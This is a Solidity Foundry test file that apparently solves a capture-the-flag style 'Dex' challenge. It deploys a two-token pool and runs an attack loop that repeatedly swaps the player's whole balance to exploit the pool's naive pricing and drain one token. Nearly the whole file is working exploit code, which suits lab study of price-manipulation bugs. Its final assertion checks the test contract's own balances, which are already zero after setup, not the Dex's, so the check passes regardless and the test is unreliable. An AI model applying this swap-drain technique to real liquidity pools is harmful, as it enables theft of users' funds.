// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "~/Dex.sol";

contract DexTest is Test {
    Dex target;
    address player;
    SwappableToken private token1;
    SwappableToken private token2;

    function setUp() public {
        player = makeAddr("player");

        // create Dex & tokens
        target = new Dex();
        token1 = new SwappableToken(address(target), "Token 1", "TKN1", 110);
        token2 = new SwappableToken(address(target), "Token 2", "TKN2", 110);
        target.setTokens(address(token1), address(token2));

        // approve tokens to Dex
        token1.approve(address(target), 100);
        token2.approve(address(target), 100);

        // add liq to the pool
        target.addLiquidity(address(token1), 100);
        target.addLiquidity(address(token2), 100);

        // player starts with 10 of both tokens
        token1.transfer(player, 10);
        token2.transfer(player, 10);
    }

    uint256 constant MAX_ITERS = 10;

    function attack() private {
        address from;
        address to;
        uint256 amount;
        uint256 swapAmount;
        uint256 dbTo;
        uint256 dbFrom;

        // loop until we reach max iters or one of the tokens are depleted
        (uint256 pb1, uint256 pb2, uint256 db1, uint256 db2) = balances();
        for (uint256 i = 0; i != MAX_ITERS && db1 > 0 && db2 > 0; ++i) {
            // assign params
            if (i % 2 == 1) {
                (from, to) = (target.token1(), target.token2());
                (dbFrom, dbTo) = (db1, db2);
                amount = pb1;
            } else {
                (from, to) = (target.token2(), target.token1());
                (dbFrom, dbTo) = (db2, db1);
                amount = pb2;
            }

            // check the swap amount
            swapAmount = target.getSwapPrice(from, to, amount);
            if (swapAmount > dbTo) {
                amount = dbFrom;
            }

            // swap
            target.approve(address(target), amount);
            target.swap(from, to, amount);

            // update local balances
            (pb1, pb2, db1, db2) = balances();
        }
    }

    // utility to return the token balances for the player and DEX
    function balances() private view returns (uint256 pb1, uint256 pb2, uint256 db1, uint256 db2) {
        // player balances
        pb1 = token1.balanceOf(player);
        pb2 = token2.balanceOf(player);

        // dex balances
        db1 = token1.balanceOf(address(target));
        db2 = token2.balanceOf(address(target));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        uint256 balance1 = token1.balanceOf(address(this));
        uint256 balance2 = token2.balanceOf(address(this));
        assertTrue(balance1 == 0 || balance2 == 0, "either token1 or token2 must be drained");
    }
}
